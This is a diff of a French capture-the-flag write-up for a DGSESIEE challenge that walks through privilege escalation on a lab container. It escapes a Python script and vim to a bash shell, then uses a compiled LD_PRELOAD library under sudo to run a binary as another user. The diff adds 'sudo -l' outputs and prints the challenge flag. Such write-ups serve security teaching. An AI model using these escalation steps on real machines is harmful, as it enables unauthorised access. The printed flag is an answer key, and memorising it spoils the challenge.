@@ -20,6 +20,7 @@ Port : 5004
 
 Le flag est de la forme DGSESIEE{hash}
 
+
 ## Accès
 
 ```bash
@@ -37,7 +38,14 @@ Sortir du script avec `Ctrl-C`
 python -c import os; os.system("/bin/bash")
 ```
 
-Taper `sudo -l` pour savoir à quoi on a droit.
+Taper `sudo -l` pour savoir à quoi on a droit:
+```
+Matching Defaults entries for user on b43e27468d7b:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD
+
+User user may run the following commands on b43e27468d7b:
+    (globalSystem) NOPASSWD: /usr/bin/vim
+```
 
 ### étape 2
 
@@ -46,6 +54,15 @@ Taper `sudo -l` pour savoir à quoi on a droit.
 ```
 puis `:!/bin/bash`
 
+
+Taper `sudo -l` pour savoir à quoi on a droit:
+```
+Matching Defaults entries for globalSystem on b43e27468d7b:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD
+
+User globalSystem may run the following commands on b43e27468d7b:
+    (navigationSystem) NOPASSWD: /usr/bin/update
+```
 
 ### étape 3
 
@@ -59,7 +76,12 @@ On va utiliser le LD_PRELOAD pour injecter du code dans le binaire, à son insu.
 
 ```bash
 cc -shared -fPIC -o /tmp/toto.so preload.c
-sudo LD_PRELOAD=/tmp/toto.so -u navigationSystem --preserve-env=LD_PRELOAD /usr/bin/update
+sudo LD_PRELOAD=/tmp/toto.so -u navigationSystem /usr/bin/update
 ```
 
-Le flag est: `DGSESIEE{44adfb64ff382f6433eeb03ed829afe0}`
+Et on obtient le contenu du fichier `flag.txt`.
+
+
+## Flag
+
+`DGSESIEE{44adfb64ff382f6433eeb03ed829afe0}`
